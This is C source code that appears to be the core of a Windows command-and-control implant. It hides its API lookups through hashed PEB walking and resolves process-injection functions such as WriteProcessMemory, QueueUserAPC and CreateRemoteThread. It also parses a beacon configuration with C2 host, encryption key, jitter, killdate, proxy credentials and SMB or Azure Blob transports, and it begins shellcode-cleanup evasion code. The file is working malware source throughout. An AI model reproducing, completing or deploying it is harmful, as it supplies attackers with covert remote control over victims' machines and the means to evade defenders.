#include "config.h"
#include "common.h"
#include "salt.h"
#include "parser.h"
#include "package.h"
#include "commands.h"
#include "crypto.h"
#include "evasion/sleepmask.h"

#ifdef HTTP_TRANSPORT
#include "transport_http.h"
#endif
#ifdef AZURE_BLOB_TRANSPORT
#include "transport_azure_blob.h"
#endif
// Always include SMB header: link client + frame I/O used by delegate forwarding
#include "transport_smb.h"

// TLV type constants (must match translator.py)
#define TLV_UUID     0x01
#define TLV_TASKID   0x02
#define TLV_COMMAND  0x03
#define TLV_DATA     0x04
#define TLV_STATUS   0x05
#define TLV_OUTPUT   0x06
#define TLV_ERROR    0x07
#define TLV_FILEID   0x08
#define TLV_FILEDATA 0x09
#define TLV_HOST     0x10
#define TLV_USER     0x11
#define TLV_PID      0x12
#define TLV_IPS      0x13
#define TLV_ARCH     0x14
#define TLV_DOMAIN   0x15
#define TLV_INTEGRITY 0x16
#define TLV_EXT_IP   0x17
#define TLV_PROCNAME 0x18
#define TLV_OS_INFO  0x19
#define TLV_DELEGATES 0x1B  // delegate blobs piggybacked on get_tasking

// Action bytes for P2P link/delegate protocol (must match translator.py)
#define ACTION_LINK_ADD    0x05
#define ACTION_LINK_MSG    0x06
#define ACTION_LINK_REMOVE 0x07

// Delegate relay magic prefix for SMB pipe frames
#define DELEGATE_RELAY_MAGIC 0xFF

// PIC-safe string/memory functions
VOID es_memcpy(PVOID dst, const PVOID src, SIZE_T len) {
    BYTE* d = (BYTE*)dst;
    BYTE* s = (BYTE*)src;
    for (SIZE_T i = 0; i < len; i++) d[i] = s[i];
}

VOID es_memset(PVOID dst, int val, SIZE_T len) {
    BYTE* d = (BYTE*)dst;
    for (SIZE_T i = 0; i < len; i++) d[i] = (BYTE)val;
}

// Compiler-generated intrinsics for -nostdlib builds
extern "C" void* memset(void* dst, int val, size_t len) {
    BYTE* d = (BYTE*)dst;
    for (size_t i = 0; i < len; i++) d[i] = (BYTE)val;
    return dst;
}

extern "C" void* memcpy(void* dst, const void* src, size_t len) {
    BYTE* d = (BYTE*)dst;
    const BYTE* s = (const BYTE*)src;
    for (size_t i = 0; i < len; i++) d[i] = s[i];
    return dst;
}

#ifdef __x86_64__
extern "C" void ___chkstk_ms(void) {
    // Minimal stack probe - no-op for PIC; the OS will fault-in pages
}
#endif

#ifdef DLL_MODE
// DLL mode: static INSTANCE with standard global access (no PIC ASM needed)
static INSTANCE g_DllInstance;
static BOOL g_DllInitialized = FALSE;

EXTERN_C ULONG __Instance_offset = 0;
EXTERN_C PVOID __Instance = NULL;

EXTERN_C PVOID _get_instance(VOID) {
    return (PVOID)&g_DllInstance;
}

// Force .reloc section - UDRL loader crashes without it
EXTERN_C __attribute__((used)) PVOID _es_reloc_anchor = (PVOID)&_get_instance;

#endif

int es_strlen(const char* s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}



VOID es_strcpy(char* dst, const char* src) {
    while (*src) *dst++ = *src++;
    *dst = 0;
}

int es_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

// ─── Base64 encode/decode (table-less, PIC-safe) ───

static char b64_enc_char(int idx) {
    if (idx < 26) return 'A' + idx;
    if (idx < 52) return 'a' + (idx - 26);
    if (idx < 62) return '0' + (idx - 52);
    if (idx == 62) return '+';
    return '/';
}

static int b64_dec_char(BYTE c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

BYTE* base64_encode(PINSTANCE inst, const BYTE* input, DWORD input_len, DWORD* out_len) {
    DWORD enc_len = ((input_len + 2) / 3) * 4;
    BYTE* output = (BYTE*)es_malloc(inst, enc_len + 1);
    if (!output) return NULL;

    DWORD j = 0;
    for (DWORD i = 0; i < input_len; i += 3) {
        DWORD rem = input_len - i;
        BYTE a = input[i];
        BYTE b = rem > 1 ? input[i + 1] : 0;
        BYTE c = rem > 2 ? input[i + 2] : 0;

        output[j++] = b64_enc_char(a >> 2);
        output[j++] = b64_enc_char(((a & 0x03) << 4) | (b >> 4));
        output[j++] = rem > 1 ? b64_enc_char(((b & 0x0F) << 2) | (c >> 6)) : '=';
        output[j++] = rem > 2 ? b64_enc_char(c & 0x3F) : '=';
    }

    output[j] = 0;
    *out_len = j;
    return output;
}

BYTE* base64_decode(PINSTANCE inst, const BYTE* input, DWORD input_len, DWORD* out_len) {
    while (input_len > 0 && (input[input_len - 1] == '\n' || input[input_len - 1] == '\r' || input[input_len - 1] == ' '))
        input_len--;
    if (input_len == 0 || input_len % 4 != 0) return NULL;

    DWORD dec_len = (input_len / 4) * 3;
    if (input[input_len - 1] == '=') dec_len--;
    if (input[input_len - 2] == '=') dec_len--;

    BYTE* output = (BYTE*)es_malloc(inst, dec_len + 1);
    if (!output) return NULL;

    DWORD j = 0;
    for (DWORD i = 0; i < input_len; i += 4) {
        int va = b64_dec_char(input[i]);
        int vb = b64_dec_char(input[i + 1]);
        int vc = (input[i + 2] == '=') ? 0 : b64_dec_char(input[i + 2]);
        int vd = (input[i + 3] == '=') ? 0 : b64_dec_char(input[i + 3]);

        if (va < 0 || vb < 0 || vc < 0 || vd < 0) {
            es_free(inst, output);
            return NULL;
        }

        DWORD triple = ((DWORD)va << 18) | ((DWORD)vb << 12) | ((DWORD)vc << 6) | (DWORD)vd;

        if (j < dec_len) output[j++] = (triple >> 16) & 0xFF;
        if (j < dec_len) output[j++] = (triple >> 8) & 0xFF;
        if (j < dec_len) output[j++] = triple & 0xFF;
    }

    *out_len = dec_len;
    return output;
}

// DJB2 hashing for PEB module/function resolution
DWORD hash_string_djb2(const char* str) {
    DWORD hash = H_MAGIC_KEY;
    int c;
    while ((c = *str++))
        hash = ((hash << H_MAGIC_SEED) + hash) + c;
    return hash;
}

DWORD hash_string_djb2_w(const wchar_t* str) {
    DWORD hash = H_MAGIC_KEY;
    int c;
    while ((c = (char)*str++)) {
        if (c >= 'A' && c <= 'Z') c += 0x20;
        hash = ((hash << H_MAGIC_SEED) + hash) + c;
    }
    return hash;
}

// PEB walking to resolve loaded modules
PVOID resolve_module_peb(DWORD hash) {
#if defined(_WIN64) || defined(__x86_64__)
    PPEB_FULL peb = (PPEB_FULL)__readgsqword(0x60);
#else
    PPEB_FULL peb = (PPEB_FULL)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA_FULL ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY_FULL mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY_FULL, InMemoryOrderLinks);
        if (mod->BaseDllName.Buffer) {
            DWORD mod_hash = hash_string_djb2_w(mod->BaseDllName.Buffer);
            if (mod_hash == hash)
                return mod->DllBase;
        }
        entry = entry->Flink;
    }
    return NULL;
}

static PVOID resolve_forwarded_module(const char* mod_name) {
#if defined(_WIN64) || defined(__x86_64__)
    PPEB_FULL peb = (PPEB_FULL)__readgsqword(0x60);
#else
    PPEB_FULL peb = (PPEB_FULL)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA_FULL ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY_FULL mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY_FULL, InMemoryOrderLinks);
        if (mod->BaseDllName.Buffer) {
            const wchar_t* dll = mod->BaseDllName.Buffer;
            const char* cmp = mod_name;
            int j = 0;
            BOOL match = TRUE;
            while (cmp[j]) {
                char dc = (char)dll[j];
                char sc = cmp[j];
                if (dc >= 'A' && dc <= 'Z') dc += 0x20;
                if (sc >= 'A' && sc <= 'Z') sc += 0x20;
                if (dc != sc) { match = FALSE; break; }
                j++;
            }
            if (match && (dll[j] == L'.' || dll[j] == 0))
                return mod->DllBase;
        }
        entry = entry->Flink;
    }
    return NULL;
}

PVOID resolve_function(PVOID module, DWORD hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)module + dos->e_lfanew);
    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD export_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!export_rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)module + export_rva);
    PDWORD names = (PDWORD)((PBYTE)module + exp->AddressOfNames);
    PWORD ordinals = (PWORD)((PBYTE)module + exp->AddressOfNameOrdinals);
    PDWORD functions = (PDWORD)((PBYTE)module + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)((PBYTE)module + names[i]);
        if (hash_string_djb2(name) == hash) {
            DWORD func_rva = functions[ordinals[i]];
            if (func_rva >= export_rva && func_rva < export_rva + export_size) {
                const char* fwd = (const char*)((PBYTE)module + func_rva);
                char fwd_mod[64] = {0};
                int dot = 0;
                while (fwd[dot] && fwd[dot] != '.' && dot < 63) {
                    fwd_mod[dot] = fwd[dot];
                    dot++;
                }
                fwd_mod[dot] = 0;
                const char* fwd_func = &fwd[dot + 1];
                PVOID target = resolve_forwarded_module(fwd_mod);
                if (target)
                    return resolve_function(target, hash_string_djb2(fwd_func));
                return NULL;
            }
            return (PVOID)((PBYTE)module + func_rva);
        }
    }
    return NULL;
}

PVOID es_malloc(PINSTANCE inst, SIZE_T size) {
    return inst->Win32.HeapAlloc(inst->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}

PVOID es_realloc(PINSTANCE inst, PVOID ptr, SIZE_T size) {
    if (!ptr) return es_malloc(inst, size);
    return inst->Win32.HeapReAlloc(inst->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, ptr, size);
}

VOID es_free(PINSTANCE inst, PVOID ptr) {
    if (ptr) inst->Win32.HeapFree(inst->Win32.GetProcessHeap(), 0, ptr);
}

// Resolve all Win32 APIs from PEB
VOID resolve_apis(PINSTANCE inst) {
    inst->Modules.Kernel32 = resolve_module_peb(H_MODULE_KERNEL32);
    inst->Modules.Ntdll    = resolve_module_peb(H_MODULE_NTDLL);

    PVOID k32 = inst->Modules.Kernel32;

    inst->Win32.LoadLibraryA    = (fnLoadLibraryA)resolve_function(k32, H_LOADLIBRARYA);
    inst->Win32.GetProcAddress  = (fnGetProcAddress)resolve_function(k32, H_GETPROCADDRESS);
    inst->Win32.VirtualAlloc    = (fnVirtualAlloc)resolve_function(k32, H_VIRTUALALLOC);
    inst->Win32.VirtualProtect  = (fnVirtualProtect)resolve_function(k32, H_VIRTUALPROTECT);
    inst->Win32.VirtualFree     = (fnVirtualFree)resolve_function(k32, H_VIRTUALFREE);
    inst->Win32.CreateThread    = (fnCreateThread)resolve_function(k32, H_CREATETHREAD);
    inst->Win32.WaitForSingleObject = (fnWaitForSingleObject)resolve_function(k32, H_WAITFORSINGLEOBJECT);
    inst->Win32.CloseHandle     = (fnCloseHandle)resolve_function(k32, H_CLOSEHANDLE);
    inst->Win32.Sleep           = (fnSleep)resolve_function(k32, H_SLEEP);
    inst->Win32.ExitProcess     = (fnExitProcess)resolve_function(k32, H_EXITPROCESS);
    inst->Win32.ExitThread      = (fnExitThread)resolve_function(k32, H_EXITTHREAD);
    inst->Win32.GetLastError    = (fnGetLastError)resolve_function(k32, H_GETLASTERROR);
    inst->Win32.GetProcessHeap  = (fnGetProcessHeap)resolve_function(k32, H_GETPROCESSHEAP);
    inst->Win32.HeapAlloc       = (fnHeapAlloc)resolve_function(k32, H_HEAPALLOC);
    inst->Win32.HeapReAlloc     = (fnHeapReAlloc)resolve_function(k32, H_HEAPREALLOC);
    inst->Win32.HeapFree        = (fnHeapFree)resolve_function(k32, H_HEAPFREE);
    inst->Win32.MultiByteToWideChar = (fnMultiByteToWideChar)resolve_function(k32, H_MULTIBYTETOWIDECHAR);

    // File/process APIs
    inst->Win32.CreateFileA         = (fnCreateFileA)resolve_function(k32, H_CREATEFILEA);
    inst->Win32.WriteFile           = (fnWriteFile)resolve_function(k32, H_WRITEFILE);
    inst->Win32.ReadFile            = (fnReadFile)resolve_function(k32, H_READFILE);
    inst->Win32.FindFirstFileA      = (fnFindFirstFileA)resolve_function(k32, H_FINDFIRSTFILEA);
    inst->Win32.FindNextFileA       = (fnFindNextFileA)resolve_function(k32, H_FINDNEXTFILEA);
    inst->Win32.FindClose           = (fnFindClose)resolve_function(k32, H_FINDCLOSE);
    inst->Win32.GetCurrentDirectoryA = (fnGetCurrentDirectoryA)resolve_function(k32, H_GETCURRENTDIRECTORYA);
    inst->Win32.SetCurrentDirectoryA = (fnSetCurrentDirectoryA)resolve_function(k32, H_SETCURRENTDIRECTORYA);
    inst->Win32.CopyFileA           = (fnCopyFileA)resolve_function(k32, H_COPYFILEA);
    inst->Win32.MoveFileA           = (fnMoveFileA)resolve_function(k32, H_MOVEFILEA);
    inst->Win32.DeleteFileA         = (fnDeleteFileA)resolve_function(k32, H_DELETEFILEA);
    inst->Win32.CreateDirectoryA    = (fnCreateDirectoryA)resolve_function(k32, H_CREATEDIRECTORYA);
    inst->Win32.RemoveDirectoryA    = (fnRemoveDirectoryA)resolve_function(k32, H_REMOVEDIRECTORYA);
    inst->Win32.GetFileSize         = (fnGetFileSize)resolve_function(k32, H_GETFILESIZE);
    inst->Win32.GetFileAttributesA  = (fnGetFileAttributesA)resolve_function(k32, H_GETFILEATTRIBUTESA);
    inst->Win32.GetCurrentProcess   = (fnGetCurrentProcess)resolve_function(k32, H_GETCURRENTPROCESS);
    inst->Win32.GetCurrentProcessId = (fnGetCurrentProcessId)resolve_function(k32, H_GETCURRENTPROCESSID);
    inst->Win32.CreateProcessA      = (fnCreateProcessA)resolve_function(k32, H_CREATEPROCESSA);
    inst->Win32.TerminateProcess    = (fnTerminateProcess)resolve_function(k32, H_TERMINATEPROCESS);
    inst->Win32.OpenProcess         = (fnOpenProcess)resolve_function(k32, H_OPENPROCESS);
    inst->Win32.WriteProcessMemory  = (fnWriteProcessMemory)resolve_function(k32, H_WRITEPROCESSMEMORY);
    inst->Win32.VirtualAllocEx      = (fnVirtualAllocEx)resolve_function(k32, H_VIRTUALALLOCEX);
    inst->Win32.QueueUserAPC        = (fnQueueUserAPC)resolve_function(k32, H_QUEUEUSERAPC);
    inst->Win32.ResumeThread        = (fnResumeThread)resolve_function(k32, H_RESUMETHREAD);
    inst->Win32.CreateProcessW      = (fnCreateProcessW)resolve_function(k32, H_CREATEPROCESSW);

    // Beacon Gate APIs
    inst->Win32.VirtualProtectEx    = (fnVirtualProtectEx)resolve_function(k32, H_VIRTUALPROTECTEX);
    inst->Win32.GetThreadContext    = (fnGetThreadContext)resolve_function(k32, H_GETTHREADCONTEXT);
    inst->Win32.SetThreadContext    = (fnSetThreadContext)resolve_function(k32, H_SETTHREADCONTEXT);
    inst->Win32.CreateRemoteThread  = (fnCreateRemoteThread)resolve_function(k32, H_CREATEREMOTETHREAD);
    inst->Win32.OpenThread          = (fnOpenThread)resolve_function(k32, H_OPENTHREAD);
    inst->Win32.CreateFileMappingA  = (fnCreateFileMappingA)resolve_function(k32, H_CREATEFILEMAPPINGA);
    inst->Win32.MapViewOfFile       = (fnMapViewOfFile)resolve_function(k32, H_MAPVIEWOFFILE);
    inst->Win32.UnmapViewOfFile     = (fnUnmapViewOfFile)resolve_function(k32, H_UNMAPVIEWOFFILE);
    inst->Win32.VirtualQuery        = (fnVirtualQuery)resolve_function(k32, H_VIRTUALQUERY);
    inst->Win32.DuplicateHandle     = (fnDuplicateHandle)resolve_function(k32, H_DUPLICATEHANDLE);
    inst->Win32.ReadProcessMemory   = (fnReadProcessMemory)resolve_function(k32, H_READPROCESSMEMORY);
    inst->Win32.VirtualFreeEx       = (fnVirtualFreeEx)resolve_function(k32, H_VIRTUALFREEEX);
    inst->Win32.VirtualQueryEx      = (fnVirtualQueryEx)resolve_function(k32, H_VIRTUALQUERYEX);

    // Ntdll
    PVOID ntdll = inst->Modules.Ntdll;
    inst->Win32.NtCreateThreadEx      = (fnNtCreateThreadEx)resolve_function(ntdll, H_NTCREATETHREADEX);
    inst->Win32.NtCreateSection       = (fnNtCreateSection)resolve_function(ntdll, H_NTCREATESECTION);
    inst->Win32.NtMapViewOfSection    = (fnNtMapViewOfSection)resolve_function(ntdll, H_NTMAPVIEWOFSECTION);
    inst->Win32.NtUnmapViewOfSection  = (fnNtUnmapViewOfSection)resolve_function(ntdll, H_NTUNMAPVIEWOFSECTION);

    // Snapshot
    inst->Win32.CreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)resolve_function(k32, H_CREATETOOLHELP32SNAPSHOT);
    inst->Win32.Process32First          = (fnProcess32First)resolve_function(k32, H_PROCESS32FIRST);
    inst->Win32.Process32Next           = (fnProcess32Next)resolve_function(k32, H_PROCESS32NEXT);

    // String
    inst->Win32.lstrlenA            = (fnlstrlenA)resolve_function(k32, H_LSTRLENA);
    inst->Win32.lstrcpyA            = (fnlstrcpyA)resolve_function(k32, H_LSTRCPYA);
    inst->Win32.lstrcmpA            = (fnlstrcmpA)resolve_function(k32, H_LSTRCMPA);
    inst->Win32.GetModuleFileNameA  = (fnGetModuleFileNameA)resolve_function(k32, H_GETMODULEFILENAMEA);
    inst->Win32.GetComputerNameExA  = (fnGetComputerNameExA)resolve_function(k32, H_GETCOMPUTERNAMEXA);
    inst->Win32.GetSystemInfo       = (fnGetSystemInfo)resolve_function(k32, H_GETSYSTEMINFO);
    inst->Win32.GetNativeSystemInfo = (fnGetNativeSystemInfo)resolve_function(k32, H_GETNATIVESYSTEMINFO);
    inst->Win32.OutputDebugStringA = (fnOutputDebugStringA)resolve_function(k32, H_OUTPUTDEBUGSTRINGA);

    // SMB
    inst->Win32.CreateNamedPipeA    = (fnCreateNamedPipeA)resolve_function(k32, H_CREATENAMEDPIPEA);
    inst->Win32.ConnectNamedPipe    = (fnConnectNamedPipe)resolve_function(k32, H_CONNECTNAMEDPIPE);
    inst->Win32.DisconnectNamedPipe = (fnDisconnectNamedPipe)resolve_function(k32, H_DISCONNECTNAMEDPIPE);
    inst->Win32.PeekNamedPipe       = (fnPeekNamedPipe)resolve_function(k32, H_PEEKNAMEDPIPE);

    // Advapi32
    STK_ADVAPI32(_advapi32);
    inst->Modules.Advapi32 = inst->Win32.LoadLibraryA(_advapi32);
    if (inst->Modules.Advapi32) {
        inst->Win32.OpenProcessToken    = (fnOpenProcessToken)resolve_function(inst->Modules.Advapi32, H_OPENPROCESSTOKEN);
        inst->Win32.GetTokenInformation = (fnGetTokenInformation)resolve_function(inst->Modules.Advapi32, H_GETTOKENINFORMATION);
        inst->Win32.LookupAccountSidA   = (fnLookupAccountSidA)resolve_function(inst->Modules.Advapi32, H_LOOKUPACCOUNTSIDA);
    }

#if defined(HTTP_TRANSPORT) || defined(AZURE_BLOB_TRANSPORT)
  #ifdef USE_WININET
    STK_WININET(_wininet);
    inst->Modules.Wininet = inst->Win32.LoadLibraryA(_wininet);
    if (inst->Modules.Wininet) {
        inst->Win32.InternetOpenA       = (fnInternetOpenA)resolve_function(inst->Modules.Wininet, H_INTERNETOPENA);
        inst->Win32.InternetConnectA    = (fnInternetConnectA)resolve_function(inst->Modules.Wininet, H_INTERNETCONNECTA);
        inst->Win32.HttpOpenRequestA    = (fnHttpOpenRequestA)resolve_function(inst->Modules.Wininet, H_HTTPOPENREQUESTA);
        inst->Win32.HttpSendRequestA    = (fnHttpSendRequestA)resolve_function(inst->Modules.Wininet, H_HTTPSENDREQUESTA);
        inst->Win32.HttpQueryInfoA      = (fnHttpQueryInfoA)resolve_function(inst->Modules.Wininet, H_HTTPQUERYINFOA);
        inst->Win32.InternetReadFile    = (fnInternetReadFile)resolve_function(inst->Modules.Wininet, H_INTERNETREADFILE);
        inst->Win32.InternetCloseHandle = (fnInternetCloseHandle)resolve_function(inst->Modules.Wininet, H_INTERNETCLOSEHANDLE);
        inst->Win32.InternetSetOptionA  = (fnInternetSetOptionA)resolve_function(inst->Modules.Wininet, H_INTERNETSETOPTIONA);
    }
  #else
    STK_WINHTTP(_winhttp);
    inst->Modules.Winhttp = inst->Win32.LoadLibraryA(_winhttp);
    if (inst->Modules.Winhttp) {
        inst->Win32.WinHttpOpen                = (fnWinHttpOpen)resolve_function(inst->Modules.Winhttp, H_WINHTTPOPEN);
        inst->Win32.WinHttpConnect             = (fnWinHttpConnect)resolve_function(inst->Modules.Winhttp, H_WINHTTPCONNECT);
        inst->Win32.WinHttpOpenRequest         = (fnWinHttpOpenRequest)resolve_function(inst->Modules.Winhttp, H_WINHTTPOPENREQUEST);
        inst->Win32.WinHttpSendRequest         = (fnWinHttpSendRequest)resolve_function(inst->Modules.Winhttp, H_WINHTTPSENDREQUEST);
        inst->Win32.WinHttpReceiveResponse      = (fnWinHttpReceiveResponse)resolve_function(inst->Modules.Winhttp, H_WINHTTPRECEIVERESPONSE);
        inst->Win32.WinHttpQueryDataAvailable   = (fnWinHttpQueryDataAvailable)resolve_function(inst->Modules.Winhttp, H_WINHTTPQUERYDATAAVAILABLE);
        inst->Win32.WinHttpReadData            = (fnWinHttpReadData)resolve_function(inst->Modules.Winhttp, H_WINHTTPREADDATA);
        inst->Win32.WinHttpCloseHandle         = (fnWinHttpCloseHandle)resolve_function(inst->Modules.Winhttp, H_WINHTTPCLOSEHANDLE);
        inst->Win32.WinHttpSetOption           = (fnWinHttpSetOption)resolve_function(inst->Modules.Winhttp, H_WINHTTPSETOPTION);
        inst->Win32.WinHttpAddRequestHeaders   = (fnWinHttpAddRequestHeaders)resolve_function(inst->Modules.Winhttp, H_WINHTTPADDREQUESTHEADERS);
        inst->Win32.WinHttpQueryHeaders        = (fnWinHttpQueryHeaders)resolve_function(inst->Modules.Winhttp, H_WINHTTPQUERYHEADERS);
    }
  #endif
#endif
}

// Parse config bytes into Instance
VOID parse_config(PINSTANCE inst, const BYTE* buf, DWORD len) {
    DWORD pos = 0;

    // UUID (36 bytes)
    if (pos + 36 > len) return;
    es_memcpy(inst->Config.uuid, (PVOID)(buf + pos), 36);
    inst->Config.uuid[36] = 0;
    pos += 36;

    // AES key (32 bytes)
    if (pos + 32 > len) return;
    es_memcpy(inst->Config.aes_key, (PVOID)(buf + pos), 32);
    pos += 32;

    // Sleep interval (4 bytes, big-endian)
    if (pos + 4 > len) return;
    inst->Config.sleep_ms = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;

    // Jitter (4 bytes, big-endian)
    if (pos + 4 > len) return;
    inst->Config.jitter = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;

    // Killdate (4 bytes, big-endian)
    if (pos + 4 > len) return;
    inst->Config.killdate = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;

#ifdef HTTP_TRANSPORT
    // Host (length-prefixed string)
    if (pos + 4 > len) return;
    DWORD slen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;
    if (pos + slen > len) return;
    DWORD copylen = slen < sizeof(inst->Http.host)-1 ? slen : sizeof(inst->Http.host)-1;
    es_memcpy(inst->Http.host, (PVOID)(buf + pos), copylen);
    inst->Http.host[copylen] = 0;
    pos += slen;

    // Port
    if (pos + 4 > len) return;
    inst->Http.port = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;

    // SSL
    if (pos + 1 > len) return;
    inst->Http.use_ssl = buf[pos++];

    // User-Agent
    if (pos + 4 > len) return;
    slen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;
    if (pos + slen > len) return;
    copylen = slen < sizeof(inst->Http.user_agent)-1 ? slen : sizeof(inst->Http.user_agent)-1;
    es_memcpy(inst->Http.user_agent, (PVOID)(buf + pos), copylen);
    inst->Http.user_agent[copylen] = 0;
    pos += slen;

    // GET URI
    if (pos + 4 > len) return;
    slen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;
    if (pos + slen > len) return;
    copylen = slen < sizeof(inst->Http.get_uri)-1 ? slen : sizeof(inst->Http.get_uri)-1;
    es_memcpy(inst->Http.get_uri, (PVOID)(buf + pos), copylen);
    inst->Http.get_uri[copylen] = 0;
    pos += slen;

    // POST URI
    if (pos + 4 > len) return;
    slen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;
    if (pos + slen > len) return;
    copylen = slen < sizeof(inst->Http.post_uri)-1 ? slen : sizeof(inst->Http.post_uri)-1;
    es_memcpy(inst->Http.post_uri, (PVOID)(buf + pos), copylen);
    inst->Http.post_uri[copylen] = 0;
    pos += slen;

    // Query param
    if (pos + 4 > len) return;
    slen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;
    if (pos + slen > len) return;
    copylen = slen < sizeof(inst->Http.query_param)-1 ? slen : sizeof(inst->Http.query_param)-1;
    es_memcpy(inst->Http.query_param, (PVOID)(buf + pos), copylen);
    inst->Http.query_param[copylen] = 0;
    pos += slen;

    // Proxy
    if (pos + 1 > len) return;
    inst->Http.use_proxy = buf[pos++];
    if (inst->Http.use_proxy) {
        // proxy_host
        if (pos + 4 > len) return;
        slen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
        pos += 4;
        if (pos + slen > len) return;
        copylen = slen < sizeof(inst->Http.proxy_host)-1 ? slen : sizeof(inst->Http.proxy_host)-1;
        es_memcpy(inst->Http.proxy_host, (PVOID)(buf + pos), copylen);
        inst->Http.proxy_host[copylen] = 0;
        pos += slen;

        // proxy_port
        if (pos + 4 > len) return;
        inst->Http.proxy_port = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
        pos += 4;

        // proxy_user
        if (pos + 4 > len) return;
        slen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
        pos += 4;
        if (pos + slen > len) return;
        copylen = slen < sizeof(inst->Http.proxy_user)-1 ? slen : sizeof(inst->Http.proxy_user)-1;
        es_memcpy(inst->Http.proxy_user, (PVOID)(buf + pos), copylen);
        inst->Http.proxy_user[copylen] = 0;
        pos += slen;

        // proxy_pass
        if (pos + 4 > len) return;
        slen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
        pos += 4;
        if (pos + slen > len) return;
        copylen = slen < sizeof(inst->Http.proxy_pass)-1 ? slen : sizeof(inst->Http.proxy_pass)-1;
        es_memcpy(inst->Http.proxy_pass, (PVOID)(buf + pos), copylen);
        inst->Http.proxy_pass[copylen] = 0;
        pos += slen;
    }
#endif

#ifdef SMB_TRANSPORT
    if (pos + 4 > len) return;
    DWORD slen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;
    if (pos + slen > len) return;
    DWORD copylen = slen < sizeof(inst->Smb.pipename)-1 ? slen : sizeof(inst->Smb.pipename)-1;
    es_memcpy(inst->Smb.pipename, (PVOID)(buf + pos), copylen);
    inst->Smb.pipename[copylen] = 0;
    pos += slen;
#endif

#ifdef AZURE_BLOB_TRANSPORT
    DWORD bslen, bcopy;
    // Blob endpoint host: {account}.blob.core.windows.net
    if (pos + 4 > len) return;
    bslen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;
    if (pos + bslen > len) return;
    bcopy = bslen < sizeof(inst->Blob.host)-1 ? bslen : sizeof(inst->Blob.host)-1;
    es_memcpy(inst->Blob.host, (PVOID)(buf + pos), bcopy);
    inst->Blob.host[bcopy] = 0;
    pos += bslen;

    // Container name: agent-{uuid12}
    if (pos + 4 > len) return;
    bslen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;
    if (pos + bslen > len) return;
    bcopy = bslen < sizeof(inst->Blob.container)-1 ? bslen : sizeof(inst->Blob.container)-1;
    es_memcpy(inst->Blob.container, (PVOID)(buf + pos), bcopy);
    inst->Blob.container[bcopy] = 0;
    pos += bslen;

    // Container-scoped SAS query string
    if (pos + 4 > len) return;
    bslen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
    pos += 4;
    if (pos + bslen > len) return;
    bcopy = bslen < sizeof(inst->Blob.sas)-1 ? bslen : sizeof(inst->Blob.sas)-1;
    es_memcpy(inst->Blob.sas, (PVOID)(buf + pos), bcopy);
    inst->Blob.sas[bcopy] = 0;
    pos += bslen;
#endif
}

// ─── CNA-type evasion helpers ───

#ifdef INCLUDE_EVASION_CLEANUP
static VOID discover_shellcode_alloc(PINSTANCE inst, PVOID addr) {
    if (!addr || !inst->Win32.VirtualQuery) return;

    MEMORY_BASIC_INFORMATION mbi;
    es_memset(&mbi, 0, sizeof(mbi));
    if (!gate_VirtualQuery(inst, addr, &mbi, sizeof(mbi)))
        return;

    PVOID alloc_base = mbi.AllocationBase;
    SIZE_T alloc_size = 0;

    while (mbi.AllocationBase == alloc_base) {
        alloc_size += mbi.RegionSize;
